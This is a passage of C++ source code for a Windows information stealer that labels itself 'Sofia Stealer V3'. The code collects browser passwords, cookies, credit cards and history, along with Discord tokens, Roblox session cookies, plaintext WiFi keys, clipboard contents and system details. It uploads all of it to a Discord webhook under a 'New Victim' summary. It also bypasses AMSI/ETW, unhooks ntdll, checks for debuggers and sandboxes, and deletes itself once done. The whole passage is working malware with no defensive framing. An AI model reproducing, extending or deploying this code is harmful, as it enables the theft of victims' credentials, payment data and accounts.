                            if (name.find(kw) != std::string::npos) {
                                SLOG("  [+] Found interesting file: %s", entry.path().string().c_str());
                                break;
                            }
                        }
                    }
                }
            }
        } catch(...) {}
    }
}

namespace Modules {
    std::vector<std::string> Roblox::Grab() {
        JUNK_CODE_SMALL
        SLOG("[*] Filtering Chromium data for Roblox cookies...");
        std::vector<std::string> cookies;
        auto chromeData = Chromium::Grab();
        for (const auto& acc : chromeData) {
            if (acc.Type == S("Cookie") && acc.URL.find(S("roblox.com")) != std::string::npos) {
                if (acc.UserName == S(".ROBLOSECURITY")) {
                    cookies.push_back(acc.Password);
                }
            }
        }

        return cookies;
    }
}

#include <wlanapi.h>
#include <string>
#include <sstream>
#include <regex>
namespace Modules {
    static std::wstring XmlTagW(const std::wstring& xml, const std::wstring& tag) {
        std::wstring open  = L"<" + tag  + L">";
        std::wstring close = L"</" + tag + L">";
        auto s = xml.find(open);
        auto e = xml.find(close);
        if (s == std::wstring::npos || e == std::wstring::npos) return L"";
        return xml.substr(s + open.size(), e - s - open.size());
    }
    static std::string WideToUtf8(const std::wstring& w) {
        if (w.empty()) return "";
        int sz = WideCharToMultiByte(CP_UTF8, 0, w.c_str(), -1, nullptr, 0, nullptr, nullptr);
        std::string s(sz, 0);
        WideCharToMultiByte(CP_UTF8, 0, w.c_str(), -1, &s[0], sz, nullptr, nullptr);
        s.resize(sz - 1);
        return s;
    }
    std::vector<WiFiRecord> WiFi::Grab() {
        JUNK_CODE_LARGE
        SLOG("[*] Searching for saved WiFi profiles...");
        std::vector<WiFiRecord> out;
        if (!DynAPI::WlanOpen || !DynAPI::WlanClose ||
            !DynAPI::WlanEnumIfaces || !DynAPI::WlanGetProfList ||
            !DynAPI::WlanGetProf || !DynAPI::WlanFree) return out;
        DWORD ver = 0;
        HANDLE hClient = nullptr;
        if (DynAPI::WlanOpen(2, nullptr, &ver, &hClient) != ERROR_SUCCESS) return out;
        PWLAN_INTERFACE_INFO_LIST pIfList = nullptr;
        if (DynAPI::WlanEnumIfaces(hClient, nullptr, &pIfList) != ERROR_SUCCESS) {
            DynAPI::WlanClose(hClient, nullptr);
            return out;
        }
        for (DWORD i = 0; i < pIfList->dwNumberOfItems; ++i) {
            const GUID& ifGuid = pIfList->InterfaceInfo[i].InterfaceGuid;
            PWLAN_PROFILE_INFO_LIST pProfList = nullptr;
            if (DynAPI::WlanGetProfList(hClient, &ifGuid, nullptr, &pProfList) != ERROR_SUCCESS) continue;
            for (DWORD j = 0; j < pProfList->dwNumberOfItems; ++j) {
                LPWSTR pXml = nullptr;
                DWORD flags = WLAN_PROFILE_GET_PLAINTEXT_KEY;
                DWORD grant = 0;
                if (DynAPI::WlanGetProf(hClient, &ifGuid, pProfList->ProfileInfo[j].strProfileName,
                    nullptr, &pXml, &flags, &grant) == ERROR_SUCCESS && pXml) {
                    std::wstring xml(pXml);
                    DynAPI::WlanFree(pXml);
                    std::wstring ssid     = XmlTagW(xml, L"name");
                    std::wstring keyMat   = XmlTagW(xml, L"keyMaterial");
                    std::wstring authAlg  = XmlTagW(xml, L"authentication");
                    WiFiRecord r;
                    r.SSID     = WideToUtf8(ssid);
                    r.Password = WideToUtf8(keyMat);
                    r.Auth     = WideToUtf8(authAlg);
                    if (!r.SSID.empty()) out.push_back(r);
                }
            }
            DynAPI::WlanFree(pProfList);
        }
        DynAPI::WlanFree(pIfList);
        DynAPI::WlanClose(hClient, nullptr);
        if (!out.empty()) SLOG("[+] Recovered %zu WiFi profiles.", out.size());
        else SLOG("[-] No WiFi profiles recovered.");
        return out;
    }
    std::string WiFi::Format(const std::vector<WiFiRecord>& data) {
        if (data.empty()) return S("No saved WiFi profiles found.\n");
        std::stringstream ss;
        int n = 1;
        for (auto& r : data) {
            ss << S("WiFi #") << n++ << "\n";
            ss << S("  SSID     : ") << r.SSID     << "\n";
            ss << S("  Password : ") << r.Password  << "\n";
            ss << S("  Auth     : ") << r.Auth      << "\n\n";
        }
        return ss.str();
    }
}

#include <sstream>
#include <winhttp.h>

namespace Modules {

    static HINTERNET g_hSession  = NULL;
    static HINTERNET g_hConnect  = NULL;
    static volatile LONG g_httpLock = 0;

    static __forceinline void HttpAcquire() {
        while (InterlockedCompareExchange(&g_httpLock, 1, 0) != 0) YieldProcessor();
    }
    static __forceinline void HttpRelease() {
        InterlockedExchange(&g_httpLock, 0);
    }

    bool Webhook::InitSession() {
        if (!DynAPI::WHttpOpen) return false;
        if (g_hSession) return true;   
        g_hSession = DynAPI::WHttpOpen(
            L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
            WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
        if (!g_hSession) return false;

        DynAPI::WHttpSetTime(g_hSession, 5000, 5000, 10000, 15000);
        g_hConnect = DynAPI::WHttpConnect(
            g_hSession, L"discord.com", INTERNET_DEFAULT_HTTPS_PORT, 0);
        if (!g_hConnect) {
            DynAPI::WHttpCloseH(g_hSession);
            g_hSession = NULL;
            return false;
        }
        SLOG("[+] Webhook: persistent session initialized.");
        return true;
    }

    void Webhook::CloseSession() {
        if (g_hConnect) { DynAPI::WHttpCloseH(g_hConnect); g_hConnect = NULL; }
        if (g_hSession) { DynAPI::WHttpCloseH(g_hSession); g_hSession = NULL; }
    }

    static DWORD PostRaw(const std::string& path,
                         const std::string& contentType,
                         const std::string& body) {
        if (!g_hSession || !g_hConnect) return 0;
        std::wstring wPath(path.begin(), path.end());

        HINTERNET hR = DynAPI::WHttpOpenReq(
            g_hConnect, L"POST", wPath.c_str(),
            NULL, WINHTTP_NO_REFERER,
            WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
        if (!hR) return 0;
        std::wstring wCT(contentType.begin(), contentType.end());
        BOOL sent = DynAPI::WHttpSendReq(
            hR, wCT.c_str(), (DWORD)wCT.size(),
            (LPVOID)body.c_str(), (DWORD)body.size(),
            (DWORD)body.size(), 0);
        DWORD code = 0;
        if (sent && DynAPI::WHttpRecvResp(hR, NULL)) {
            DWORD sz = sizeof(code);
            DynAPI::WHttpQueryH(hR,
                WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
                WINHTTP_HEADER_NAME_BY_INDEX, &code, &sz,
                WINHTTP_NO_HEADER_INDEX);
        }
        DynAPI::WHttpCloseH(hR);
        return code;
    }

    static bool PostWithRateLimit(const std::string& path,
                                  const std::string& contentType,
                                  const std::string& body,
                                  int maxRetries = 4) {
        for (int i = 0; i < maxRetries; ++i) {
            DWORD code = PostRaw(path, contentType, body);
            if (code >= 200 && code < 300) {
                SLOG("  [+] POST ok (code=%lu attempt=%d)", code, i + 1);
                return true;
            }
            if (code == 429) {

                SLOG("  [!] Rate-limited (429), backing off 1s...");
                Internal::SleepMs(1000);
                continue;
            }
            if (code == 0) {

                SLOG("  [-] Transport error, retrying (%d/%d)...", i + 1, maxRetries);
                Internal::SleepMs(300);
                continue;
            }
            SLOG("  [-] POST failed code=%lu", code);
            return false;
        }
        return false;
    }

    bool Webhook::SendFile(const std::string& url,
                           const std::string& content,
                           const std::string& fileName) {

        std::string pfx = "/api/webhooks";
        size_t pos = url.find(pfx);
        std::string path = (pos != std::string::npos) ? url.substr(pos) : url;

        std::string bnd = "SofiaBnd" + std::to_string(
            Internal::_GetTickCount ? Internal::_GetTickCount() : 42);
        std::string body;
        body.reserve(content.size() + 256);
        body  = "--"; body += bnd; body += "\r\n";
        body += "Content-Disposition: form-data; name=\"file\"; filename=\"";
        body += fileName;
        body += "\"\r\nContent-Type: text/plain; charset=utf-8\r\n\r\n";
        body += content;
        body += "\r\n--"; body += bnd; body += "--\r\n";
        std::string ct = "Content-Type: multipart/form-data; boundary=" + bnd;
        SLOG("[*] Uploading: %s (%zu bytes)", fileName.c_str(), content.size());
        return PostWithRateLimit(path, ct, body);
    }

    bool Webhook::SendEmbed(const std::string& url,
                            const std::string& jsonPayload) {
        std::string pfx = "/api/webhooks";
        size_t pos = url.find(pfx);
        std::string path = (pos != std::string::npos) ? url.substr(pos) : url;
        SLOG("[*] Sending summary embed...");
        return PostWithRateLimit(path, "Content-Type: application/json", jsonPayload);
    }

    bool Webhook::SendFileRetry(const std::string& url,
                                const std::string& content,
                                const std::string& fileName,
                                int maxRetries) {

        (void)maxRetries;
        return SendFile(url, content, fileName);
    }

    std::string Webhook::BuildSummaryEmbed(
        const std::string& hostname, const std::string& username,
        const std::string& os, const std::string& ip,
        int passwords, int cookies, int cards, int tokens,
        int wifi, bool clipboard)
    {
        std::stringstream r;
        r << "{\"embeds\":[{";
        r << "\"title\":\"Sofia Stealer V3 - New Victim\",";
        r << "\"color\":3447003,";
        r << "\"footer\":{\"text\":\"Sofia Stealer V3\"},";
        r << "\"fields\":[";
        r << "{\"name\":\"Machine\",\"value\":\"" << hostname << " / " << username << "\",\"inline\":false},";
        r << "{\"name\":\"OS\",\"value\":\"" << os << "\",\"inline\":false},";
        r << "{\"name\":\"Public IP\",\"value\":\"" << ip << "\",\"inline\":true},";
        r << "{\"name\":\"Passwords\",\"value\":\"" << passwords << "\",\"inline\":true},";
        r << "{\"name\":\"Cookies\",\"value\":\"" << cookies << "\",\"inline\":true},";
        r << "{\"name\":\"Cards\",\"value\":\"" << cards << "\",\"inline\":true},";
        r << "{\"name\":\"Discord\",\"value\":\"" << tokens << "\",\"inline\":true},";
        r << "{\"name\":\"WiFi\",\"value\":\"" << wifi << "\",\"inline\":true},";
        r << "{\"name\":\"Clipboard\",\"value\":\"" << (clipboard ? "Yes" : "Empty") << "\",\"inline\":true}";
        r << "]}]}";
        return r.str();
    }
}

#include <windows.h>
#include <sstream>
#include <algorithm>
using namespace Modules;

struct CollectResults {

    std::vector<Account>        chromium;
    std::string txtPasswords, txtCookies, txtCards, txtHistory;
    int cntPw = 0, cntCk = 0, cntCd = 0, cntHi = 0;

    std::vector<DiscordAccount> discord;
    std::string txtDiscord;
    int validTokens = 0;

    std::vector<std::string>    roblox;
    std::string txtRoblox;

    std::vector<WiFiRecord>     wifi;
    std::string txtWifi;

    ClipboardData               clip;
    std::string txtClipboard;
    bool hasClip = false;

    SystemInfoData              sys;
    std::string txtSys;
    volatile LONG               sysReady = 0;
};

static DWORD WINAPI ThreadChromium(LPVOID p) {
    auto* r = (CollectResults*)p;
    r->chromium = Chromium::Grab();
    for (auto& a : r->chromium) {
        std::string line = "Browser: " + a.Application + " | URL: " + a.URL
                         + " | User: " + a.UserName + " | Pass: " + a.Password + "\n";
        if      (a.Type == "Password")   { r->txtPasswords += line; ++r->cntPw; }
        else if (a.Type == "Cookie")     { r->txtCookies   += line; ++r->cntCk; }
        else if (a.Type == "CreditCard") { r->txtCards     += line; ++r->cntCd; }
        else if (a.Type == "History")    { r->txtHistory   += line; ++r->cntHi; }
    }
    if (r->txtPasswords.empty()) r->txtPasswords = "No passwords found.\n";
    if (r->txtCookies.empty())   r->txtCookies   = "No cookies found.\n";
    if (r->txtCards.empty())     r->txtCards     = "No credit cards found.\n";
    if (r->txtHistory.empty())   r->txtHistory   = "No history found.\n";
    SLOG("[+] [T] Chromium: %d pw %d ck %d cd %d hi", r->cntPw, r->cntCk, r->cntCd, r->cntHi);
    return 0;
}

static DWORD WINAPI ThreadDiscord(LPVOID p) {
    auto* r = (CollectResults*)p;
    r->discord = Discord::Grab();
    r->txtDiscord = Discord::Format(r->discord);
    r->validTokens = (int)std::count_if(r->discord.begin(), r->discord.end(),
        [](const DiscordAccount& a){ return a.Valid; });
    SLOG("[+] [T] Discord: %d total %d valid", (int)r->discord.size(), r->validTokens);
    return 0;
}

static DWORD WINAPI ThreadRoblox(LPVOID p) {
    auto* r = (CollectResults*)p;
    r->roblox = Roblox::Grab();
    int n = 1;
    for (auto& c : r->roblox)
        r->txtRoblox += "Cookie #" + std::to_string(n++) + ":\n" + c + "\n\n";
    if (r->txtRoblox.empty()) r->txtRoblox = "No Roblox cookies found.\n";
    SLOG("[+] [T] Roblox: %d cookies", (int)r->roblox.size());
    return 0;
}

static DWORD WINAPI ThreadWifi(LPVOID p) {
    auto* r = (CollectResults*)p;
    r->wifi = WiFi::Grab();
    r->txtWifi = WiFi::Format(r->wifi);
    SLOG("[+] [T] WiFi: %d profiles", (int)r->wifi.size());
    return 0;
}

static DWORD WINAPI ThreadClipboard(LPVOID p) {
    auto* r = (CollectResults*)p;
    r->clip = Clipboard::Grab();
    r->txtClipboard = Clipboard::Format(r->clip);
    r->hasClip = (r->clip.Type != "Empty");
    SLOG("[+] [T] Clipboard: %s", r->clip.Type.c_str());
    return 0;
}

static DWORD WINAPI ThreadSysInfo(LPVOID p) {
    auto* r = (CollectResults*)p;
    r->sys = SystemInfo::Collect();
    r->txtSys = SystemInfo::Format(r->sys);
    InterlockedExchange(&r->sysReady, 1);
    SLOG("[+] [T] SysInfo: %s@%s", r->sys.Username.c_str(), r->sys.Hostname.c_str());
    return 0;
}

static HANDLE SpawnThread(LPTHREAD_START_ROUTINE fn, LPVOID param) {

    HANDLE hThread = NULL;
    NTSTATUS st = Internal::NtCreateThreadEx(
        &hThread, THREAD_ALL_ACCESS, NULL,
        (HANDLE)-1, (PVOID)fn, param,
        0, 0, 0, 0, NULL);
    if (st == 0 && hThread) return hThread;

    auto k32Str = OBFS_S("kernel32.dll");
    HMODULE hK32 = Internal::_GetModuleHandleA(k32Str.c_str());
    if (hK32 && Internal::_GetProcAddress) {
        auto ctStr = OBFS_S("CreateThread");
        typedef HANDLE(WINAPI* CT_t)(LPSECURITY_ATTRIBUTES, SIZE_T,
                                     LPTHREAD_START_ROUTINE, LPVOID,
                                     DWORD, LPDWORD);
        auto pCT = (CT_t)Internal::_GetProcAddress(hK32, ctStr.c_str());
        if (pCT) hThread = pCT(NULL, 0, fn, param, 0, NULL);
    }
    return hThread;
}

static void JoinThread(HANDLE hThread) {
    if (!hThread) return;
    Internal::NtWaitForSingleObject(hThread, FALSE, NULL);
    Internal::NtClose(hThread);
}

int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
    SLOG_INIT();
    SLOG("--- Sofia Stealer V3 ---");

    if (!Internal::Initialize()) {
        SLOG("[-] Core stealth engine init FAILED");
        return 0;
    }
    SLOG("[+] Core stealth engine initialized");

    NtdllUnhook::Execute();
    SLOG("[+] Ntdll unhooking completed");

    Bypass::ExecuteAll();
    SLOG("[+] AMSI/ETW bypass completed");

    if (!DynAPI::Initialize()) {
        SLOG("[-] Failed to initialize Dynamic APIs.");
        return 0;
    }
    SLOG("[+] Dynamic APIs initialized.");

    if (!Utils::Impersonator::IsAdmin()) {
        SLOG("[!] WARNING: Not running as Administrator.");
    }

    WSADATA wsa;
    if (Internal::_WSAStartup) {
        Internal::_WSAStartup(MAKEWORD(2, 2), &wsa);
    }
    SLOG("[+] WSA initialized.");

    JUNK_CODE_LARGE
    if (!AntiAnalysis::SetMutex()) {
        SLOG("[-] Found another instance running. Exiting.");
        return 0;
    }
    AntiAnalysis::HideFromScreenCapture();
    if (AntiAnalysis::IsDebugger() || AntiAnalysis::IsSandbox()) {
        SLOG("[-] Anti-analysis check failed. Terminating.");
        return 0;
    }
    SLOG("[+] Anti-analysis gauntlet passed.");
    JUNK_CODE_SMALL

    SLOG("[*] Starting obfuscated sleep...");
    SleepObf::ObfuscatedSleep(1000 + (Internal::SecureRand(1000)));
    SLOG("[+] Obfuscated sleep complete.");

    JUNK_CODE_SMALL
    SLOG("[*] Launching parallel collection threads...");
    CollectResults res;

    HANDLE hThreads[6];
    hThreads[0] = SpawnThread(ThreadChromium,  &res);
    hThreads[1] = SpawnThread(ThreadDiscord,   &res);
    hThreads[2] = SpawnThread(ThreadRoblox,    &res);
    hThreads[3] = SpawnThread(ThreadWifi,      &res);
    hThreads[4] = SpawnThread(ThreadClipboard, &res);
    hThreads[5] = SpawnThread(ThreadSysInfo,   &res);

    SLOG("[*] Threads launched — waiting for completion...");
    for (int i = 0; i < 6; ++i) JoinThread(hThreads[i]);
    SLOG("[+] All collection threads finished.");

    if (Config::GrabFiles) {
        SLOG("[*] Grabbing sensitive files...");
        FileGrabber::Grab();
        SLOG("[+] File grabbing complete.");
    }

    std::string wh = Config::GetWebhookURL();
    SLOG("[*] Initializing webhook session...");
    if (!Webhook::InitSession()) {
        SLOG("[-] Failed to initialize webhook session.");
    }

    SLOG("[*] Building and sending summary embed...");
    std::string embed = Webhook::BuildSummaryEmbed(
        res.sys.Hostname, res.sys.Username, res.sys.OS, res.sys.PublicIP,
        res.cntPw, res.cntCk, res.cntCd, res.validTokens,
        (int)res.wifi.size(), res.hasClip);
    Webhook::SendEmbed(wh, embed);
    SLOG("[+] Summary embed sent.");

    SLOG("[*] Exfiltrating collected data...");
    Webhook::SendFile(wh, res.txtSys,       S("SystemInfo.txt"));
    SLOG("  [+] SystemInfo.txt");
    Webhook::SendFile(wh, res.txtPasswords, S("Passwords.txt"));
    SLOG("  [+] Passwords.txt");
    Webhook::SendFile(wh, res.txtDiscord,   S("DiscordTokens.txt"));
    SLOG("  [+] DiscordTokens.txt");
    Webhook::SendFile(wh, res.txtCookies,   S("Cookies.txt"));
    SLOG("  [+] Cookies.txt");
    Webhook::SendFile(wh, res.txtCards,     S("CreditCards.txt"));
    SLOG("  [+] CreditCards.txt");
    Webhook::SendFile(wh, res.txtRoblox,    S("RobloxCookies.txt"));
    SLOG("  [+] RobloxCookies.txt");
    Webhook::SendFile(wh, res.txtWifi,      S("WiFiPasswords.txt"));
    SLOG("  [+] WiFiPasswords.txt");
    Webhook::SendFile(wh, res.txtHistory,   S("History.txt"));
    SLOG("  [+] History.txt");
    Webhook::SendFile(wh, res.txtClipboard, S("Clipboard.txt"));
    SLOG("  [+] Clipboard.txt");
    SLOG("[+] Exfiltration complete.");

    Webhook::CloseSession();
    if (Internal::_WSACleanup) Internal::_WSACleanup();

    SLOG("[*] Performing self-delete...");
    {
        typedef BOOL(WINAPI* SetFileInformationByHandle_t)(HANDLE, int, LPVOID, DWORD);
        typedef HANDLE(WINAPI* CreateFileW_t)(LPCWSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
        typedef DWORD(WINAPI* GetModuleFileNameW_t)(HMODULE, LPWSTR, DWORD);

        auto k32Str = OBFS_S("kernel32.dll");
        HMODULE hK32 = Internal::_GetModuleHandleA(k32Str.c_str());
        if (hK32) {
            auto sfih = (SetFileInformationByHandle_t)Internal::_GetProcAddress(hK32, OBFS_S("SetFileInformationByHandle").c_str());
            auto cfw  = (CreateFileW_t)Internal::_GetProcAddress(hK32, OBFS_S("CreateFileW").c_str());
            auto gmfw = (GetModuleFileNameW_t)Internal::_GetProcAddress(hK32, OBFS_S("GetModuleFileNameW").c_str());

            wchar_t selfPathW[MAX_PATH] = {};
            if (sfih && cfw && gmfw && gmfw(NULL, selfPathW, MAX_PATH)) {
                HANDLE hSelf = cfw(selfPathW, DELETE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
                if (hSelf != INVALID_HANDLE_VALUE) {
                    struct {
                        BOOLEAN ReplaceIfExists;
                        HANDLE  RootDirectory;
                        ULONG   FileNameLength;
                        wchar_t FileName[3];
                    } renameInfo = {};
                    renameInfo.FileName[0] = L':';
                    renameInfo.FileName[1] = L'x';
                    renameInfo.FileName[2] = L'\0';
                    renameInfo.FileNameLength = 2 * sizeof(wchar_t);
                    sfih(hSelf, 3, &renameInfo, sizeof(renameInfo));
                    Internal::_CloseHandle(hSelf);

                    hSelf = cfw(selfPathW, DELETE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
                    if (hSelf != INVALID_HANDLE_VALUE) {
                        struct { BOOLEAN DeleteFile; } dispInfo = { TRUE };
                        sfih(hSelf, 4, &dispInfo, sizeof(dispInfo));
                        Internal::_CloseHandle(hSelf);
                        SLOG("[+] Self-delete via stream rename OK.");
                    }
                }
            }
        }
    }
    SLOG("[+] Self-delete scheduled. Goodbye.");
    SLOG_CLOSE();
    return 0;
}
